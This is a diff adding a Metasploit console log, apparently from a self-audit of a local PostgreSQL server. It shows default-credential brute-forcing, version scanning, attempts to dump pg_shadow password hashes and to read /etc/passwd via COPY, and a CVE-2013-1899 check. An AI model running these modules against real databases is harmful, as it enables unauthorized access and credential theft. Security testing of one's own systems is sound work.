@@ -1,0 +1,224 @@
+[*] Processing postgres_scan.rc for ERB directives.
+resource (postgres_scan.rc)> use uxiliary/scanner/postgres/postgres_login
+
+Matching Modules
+================
+
+   #  Name                                       Disclosure Date  Rank    Check  Description
+   -  ----                                       ---------------  ----    -----  -----------
+   0  auxiliary/scanner/postgres/postgres_login  .                normal  No     PostgreSQL Login Utility
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/postgres/postgres_login
+
+[*] Using auxiliary/scanner/postgres/postgres_login
+[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
+resource (postgres_scan.rc)> set RHOSTS localhost
+RHOSTS => localhost
+resource (postgres_scan.rc)> set RPORT 5432
+RPORT => 5432
+resource (postgres_scan.rc)> set USERNAME testuser
+USERNAME => testuser
+resource (postgres_scan.rc)> set PASSWORD 1234
+PASSWORD => 1234
+resource (postgres_scan.rc)> run
+[!] No active DB -- Credential data will not be saved!
+[+] 127.0.0.1:5432 - Login Successful: testuser:1234@template1
+[-] 127.0.0.1:5432 - LOGIN FAILED: :1234@template1 (Incorrect: FATAL	VFATAL	C28000	Mno PostgreSQL user name specified in startup packet	Fpostmaster.c	L2270	RProcessStartupPacket)
+[-] 127.0.0.1:5432 - LOGIN FAILED: :@template1 (Incorrect: FATAL	VFATAL	C28000	Mno PostgreSQL user name specified in startup packet	Fpostmaster.c	L2270	RProcessStartupPacket)
+[-] 127.0.0.1:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: FATAL	VFATAL	C28000	Mno PostgreSQL user name specified in startup packet	Fpostmaster.c	L2270	RProcessStartupPacket)
+[-] 127.0.0.1:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: FATAL	VFATAL	C28000	Mno PostgreSQL user name specified in startup packet	Fpostmaster.c	L2270	RProcessStartupPacket)
+[-] 127.0.0.1:5432 - LOGIN FAILED: :password@template1 (Incorrect: FATAL	VFATAL	C28000	Mno PostgreSQL user name specified in startup packet	Fpostmaster.c	L2270	RProcessStartupPacket)
+[-] 127.0.0.1:5432 - LOGIN FAILED: :admin@template1 (Incorrect: FATAL	VFATAL	C28000	Mno PostgreSQL user name specified in startup packet	Fpostmaster.c	L2270	RProcessStartupPacket)
+[+] 127.0.0.1:5432 - Login Successful: postgres:1234@template1
+[-] 127.0.0.1:5432 - LOGIN FAILED: scott:1234@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "scott"	Fauth.c	L323	Rauth_failed)
+[-] 127.0.0.1:5432 - LOGIN FAILED: scott:@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "scott"	Fauth.c	L323	Rauth_failed)
+[-] 127.0.0.1:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "scott"	Fauth.c	L323	Rauth_failed)
+[-] 127.0.0.1:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "scott"	Fauth.c	L323	Rauth_failed)
+[-] 127.0.0.1:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "scott"	Fauth.c	L323	Rauth_failed)
+[-] 127.0.0.1:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "scott"	Fauth.c	L323	Rauth_failed)
+[-] 127.0.0.1:5432 - LOGIN FAILED: admin:1234@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "admin"	Fauth.c	L323	Rauth_failed)
+[-] 127.0.0.1:5432 - LOGIN FAILED: admin:@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "admin"	Fauth.c	L323	Rauth_failed)
+[-] 127.0.0.1:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "admin"	Fauth.c	L323	Rauth_failed)
+[-] 127.0.0.1:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "admin"	Fauth.c	L323	Rauth_failed)
+[-] 127.0.0.1:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "admin"	Fauth.c	L323	Rauth_failed)
+[-] 127.0.0.1:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "admin"	Fauth.c	L323	Rauth_failed)
+[-] 127.0.0.1:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "admin"	Fauth.c	L323	Rauth_failed)
+[-] 127.0.0.1:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "admin"	Fauth.c	L323	Rauth_failed)
+[*] Scanned 1 of 2 hosts (50% complete)
+[!] No active DB -- Credential data will not be saved!
+[+] ::1:5432 - Login Successful: testuser:1234@template1
+[-] ::1:5432 - LOGIN FAILED: :1234@template1 (Incorrect: FATAL	VFATAL	C28000	Mno PostgreSQL user name specified in startup packet	Fpostmaster.c	L2270	RProcessStartupPacket)
+[-] ::1:5432 - LOGIN FAILED: :@template1 (Incorrect: FATAL	VFATAL	C28000	Mno PostgreSQL user name specified in startup packet	Fpostmaster.c	L2270	RProcessStartupPacket)
+[-] ::1:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: FATAL	VFATAL	C28000	Mno PostgreSQL user name specified in startup packet	Fpostmaster.c	L2270	RProcessStartupPacket)
+[-] ::1:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: FATAL	VFATAL	C28000	Mno PostgreSQL user name specified in startup packet	Fpostmaster.c	L2270	RProcessStartupPacket)
+[-] ::1:5432 - LOGIN FAILED: :password@template1 (Incorrect: FATAL	VFATAL	C28000	Mno PostgreSQL user name specified in startup packet	Fpostmaster.c	L2270	RProcessStartupPacket)
+[-] ::1:5432 - LOGIN FAILED: :admin@template1 (Incorrect: FATAL	VFATAL	C28000	Mno PostgreSQL user name specified in startup packet	Fpostmaster.c	L2270	RProcessStartupPacket)
+[+] ::1:5432 - Login Successful: postgres:1234@template1
+[-] ::1:5432 - LOGIN FAILED: scott:1234@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "scott"	Fauth.c	L323	Rauth_failed)
+[-] ::1:5432 - LOGIN FAILED: scott:@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "scott"	Fauth.c	L323	Rauth_failed)
+[-] ::1:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "scott"	Fauth.c	L323	Rauth_failed)
+[-] ::1:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "scott"	Fauth.c	L323	Rauth_failed)
+[-] ::1:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "scott"	Fauth.c	L323	Rauth_failed)
+[-] ::1:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "scott"	Fauth.c	L323	Rauth_failed)
+[-] ::1:5432 - LOGIN FAILED: admin:1234@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "admin"	Fauth.c	L323	Rauth_failed)
+[-] ::1:5432 - LOGIN FAILED: admin:@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "admin"	Fauth.c	L323	Rauth_failed)
+[-] ::1:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "admin"	Fauth.c	L323	Rauth_failed)
+[-] ::1:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "admin"	Fauth.c	L323	Rauth_failed)
+[-] ::1:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "admin"	Fauth.c	L323	Rauth_failed)
+[-] ::1:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "admin"	Fauth.c	L323	Rauth_failed)
+[-] ::1:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "admin"	Fauth.c	L323	Rauth_failed)
+[-] ::1:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: FATAL	VFATAL	C28P01	Mpassword authentication failed for user "admin"	Fauth.c	L323	Rauth_failed)
+[*] Scanned 2 of 2 hosts (100% complete)
+[*] Bruteforce completed, 4 credentials were successful.
+[*] You can open a Postgres session with these credentials and CreateSession set to true
+[*] Auxiliary module execution completed
+resource (postgres_scan.rc)> use auxiliary/scanner/postgres/postgres_version
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+resource (postgres_scan.rc)> set RHOSTS localhost
+RHOSTS => localhost
+resource (postgres_scan.rc)> set RPORT 5432
+RPORT => 5432
+resource (postgres_scan.rc)> set USERNAME testuser
+USERNAME => testuser
+resource (postgres_scan.rc)> set PASSWORD 1234
+PASSWORD => 1234
+resource (postgres_scan.rc)> run
+[*] 127.0.0.1:5432 Postgres - Version PostgreSQL 16.3 on x86_64-redhat-linux-gnu, compiled by gcc (GCC) 14.1.1 20240522 (Red Hat 14.1.1-4), 64-bit (Post-Auth)
+[*] Scanned 1 of 2 hosts (50% complete)
+[*] ::1:5432 Postgres - Version PostgreSQL 16.3 on x86_64-redhat-linux-gnu, compiled by gcc (GCC) 14.1.1 20240522 (Red Hat 14.1.1-4), 64-bit (Post-Auth)
+[*] Scanned 2 of 2 hosts (100% complete)
+[*] Auxiliary module execution completed
+resource (postgres_scan.rc)> use auxiliary/scanner/postgres/postgres_hashdump
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+resource (postgres_scan.rc)> set RHOSTS localhost
+RHOSTS => localhost
+resource (postgres_scan.rc)> set RPORT 5432
+RPORT => 5432
+resource (postgres_scan.rc)> set USERNAME testuser
+USERNAME => testuser
+resource (postgres_scan.rc)> set PASSWORD 1234
+PASSWORD => 1234
+resource (postgres_scan.rc)> run
+[-] 127.0.0.1:5432 Postgres - VERROR SQL statement 'SELECT usename, passwd FROM pg_shadow' returns #<RuntimeError: ERROR	VERROR	C42501	Mpermission denied for view pg_shadow	Faclchk.c	L2807	Raclcheck_error>
+[*] Scanned 1 of 2 hosts (50% complete)
+[-] ::1:5432 Postgres - VERROR SQL statement 'SELECT usename, passwd FROM pg_shadow' returns #<RuntimeError: ERROR	VERROR	C42501	Mpermission denied for view pg_shadow	Faclchk.c	L2807	Raclcheck_error>
+[*] Scanned 2 of 2 hosts (100% complete)
+[*] Auxiliary module execution completed
+resource (postgres_scan.rc)> use auxiliary/admin/postgres/postgres_readfile
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+resource (postgres_scan.rc)> set RHOSTS localhost
+RHOSTS => localhost
+resource (postgres_scan.rc)> set RPORT 5432
+RPORT => 5432
+resource (postgres_scan.rc)> set USERNAME testuser
+USERNAME => testuser
+resource (postgres_scan.rc)> set PASSWORD 1234
+PASSWORD => 1234
+resource (postgres_scan.rc)> run
+[*] Running module against 127.0.0.1
+[-] 127.0.0.1:5432 Postgres - VERROR SQL statement 'CREATE TEMP TABLE swbpyA (INPUT TEXT);
+      COPY swbpyA FROM '/etc/passwd';
+      SELECT * FROM swbpyA' returns #<RuntimeError: ERROR	VERROR	C42501	Mpermission denied to COPY from a file	DOnly roles with privileges of the "pg_read_server_files" role may COPY from a file.	HAnyone can COPY to stdout or from stdin. psql's \copy command also works for anyone.	Fcopy.c	L95	RDoCopy>
+[*] Running module against ::1
+[-] ::1:5432 Postgres - VERROR SQL statement 'CREATE TEMP TABLE lKuaooqhibfbKU (INPUT TEXT);
+      COPY lKuaooqhibfbKU FROM '/etc/passwd';
+      SELECT * FROM lKuaooqhibfbKU' returns #<RuntimeError: ERROR	VERROR	C42501	Mpermission denied to COPY from a file	DOnly roles with privileges of the "pg_read_server_files" role may COPY from a file.	HAnyone can COPY to stdout or from stdin. psql's \copy command also works for anyone.	Fcopy.c	L95	RDoCopy>
+[*] Auxiliary module execution completed
+resource (postgres_scan.rc)> use auxiliary/admin/postgres/postgres_sql
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+resource (postgres_scan.rc)> set RHOSTS localhost
+RHOSTS => localhost
+resource (postgres_scan.rc)> set RPORT 5432
+RPORT => 5432
+resource (postgres_scan.rc)> set USERNAME testuser
+USERNAME => testuser
+resource (postgres_scan.rc)> set PASSWORD 1234
+PASSWORD => 1234
+resource (postgres_scan.rc)> run
+[*] Running module against 127.0.0.1
+Query Text: 'select version()'
+==============================
+
+    version
+    -------
+    PostgreSQL 16.3 on x86_64-redhat-linux-gnu, compiled by gcc (GCC) 14.1.1 2024052
+    2 (Red Hat 14.1.1-4), 64-bit
+
+[*] Running module against ::1
+Query Text: 'select version()'
+==============================
+
+    version
+    -------
+    PostgreSQL 16.3 on x86_64-redhat-linux-gnu, compiled by gcc (GCC) 14.1.1 2024052
+    2 (Red Hat 14.1.1-4), 64-bit
+
+[*] Auxiliary module execution completed
+resource (postgres_scan.rc)> use auxiliary/admin/postgres/postgres_schema_dump
+[-] No results from search
+[-] Failed to load module: auxiliary/admin/postgres/postgres_schema_dump
+resource (postgres_scan.rc)> set RHOSTS localhost
+RHOSTS => localhost
+resource (postgres_scan.rc)> set RPORT 5432
+RPORT => 5432
+resource (postgres_scan.rc)> set USERNAME testuser
+USERNAME => testuser
+resource (postgres_scan.rc)> set PASSWORD 1234
+PASSWORD => 1234
+resource (postgres_scan.rc)> run
+[*] Running module against 127.0.0.1
+Query Text: 'select version()'
+==============================
+
+    version
+    -------
+    PostgreSQL 16.3 on x86_64-redhat-linux-gnu, compiled by gcc (GCC) 14.1.1 2024052
+    2 (Red Hat 14.1.1-4), 64-bit
+
+[*] Running module against ::1
+Query Text: 'select version()'
+==============================
+
+    version
+    -------
+    PostgreSQL 16.3 on x86_64-redhat-linux-gnu, compiled by gcc (GCC) 14.1.1 2024052
+    2 (Red Hat 14.1.1-4), 64-bit
+
+[*] Auxiliary module execution completed
+resource (postgres_scan.rc)> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
+resource (postgres_scan.rc)> set RHOSTS localhost
+RHOSTS => localhost
+resource (postgres_scan.rc)> set RPORT 5432
+RPORT => 5432
+resource (postgres_scan.rc)> set USERNAME testuser
+[!] Unknown datastore option: USERNAME.
+USERNAME => testuser
+resource (postgres_scan.rc)> set PASSWORD 1234
+[!] Unknown datastore option: PASSWORD.
+PASSWORD => 1234
+resource (postgres_scan.rc)> run
+[*] 127.0.0.1:5432        - 127.0.0.1:5432 does not appear to be vulnerable to CVE-2013-1899
+[*] localhost:5432        - Scanned 1 of 2 hosts (50% complete)
+[*] ::1:5432              - ::1:5432 does not appear to be vulnerable to CVE-2013-1899
+[*] localhost:5432        - Scanned 2 of 2 hosts (100% complete)
+[*] Auxiliary module execution completed
+resource (postgres_scan.rc)> use auxiliary/scanner/postgres/postgres_bypass
+[-] No results from search
+[-] Failed to load module: auxiliary/scanner/postgres/postgres_bypass
+resource (postgres_scan.rc)> set RHOSTS localhost
+RHOSTS => localhost
+resource (postgres_scan.rc)> set RPORT 5432
+RPORT => 5432
+resource (postgres_scan.rc)> set USERNAME testuser
+USERNAME => testuser
+resource (postgres_scan.rc)> set PASSWORD 1234
+PASSWORD => 1234
+resource (postgres_scan.rc)> run
+[*] 127.0.0.1:5432        - 127.0.0.1:5432 does not appear to be vulnerable to CVE-2013-1899
+[*] localhost:5432        - Scanned 1 of 2 hosts (50% complete)
+[*] ::1:5432              - ::1:5432 does not appear to be vulnerable to CVE-2013-1899
+[*] localhost:5432        - Scanned 2 of 2 hosts (100% complete)
+[*] Auxiliary module execution completed
+resource (postgres_scan.rc)> exit
+Scan completed at Wed 20 Nov 2024 01:31:56 AM EST
